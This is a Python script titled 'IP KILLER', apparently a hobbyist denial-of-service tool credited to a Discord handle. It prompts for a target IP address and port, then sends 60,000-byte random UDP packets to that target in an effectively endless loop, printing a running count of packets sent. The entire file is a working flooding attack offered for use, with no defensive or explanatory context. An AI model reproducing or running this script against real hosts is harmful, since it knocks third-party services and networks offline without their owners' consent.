import socket
import random
import time
from colorama import init, Fore, Back, Style
from os import system, name
from pyfiglet import Figlet

def clear():
  
    # Windows
    if name == 'nt':
        _ = system('cls')
  
    # Mac & Linux
    else:
        _ = system('clear')
clear()

print(Fore.RED + '\n')

def render(text):
    f = Figlet() 
    print('\n'*1)
    print(f.renderText(text))
render('IP KILLER')
print("\n")
print(Fore.WHITE + "Made by Clxpz#5854")
print('\n')

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input(Fore.LIGHTBLUE_EX + "Enter Target IP: ")
port = int(input(Fore.LIGHTBLUE_EX + "Enter Target Port: "))
#sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 10000**10000):
    s.send(random._urandom(10)*6000)
    print(Fore.YELLOW + f"Send: {i}", end='\r')
    #time.sleep(sleep)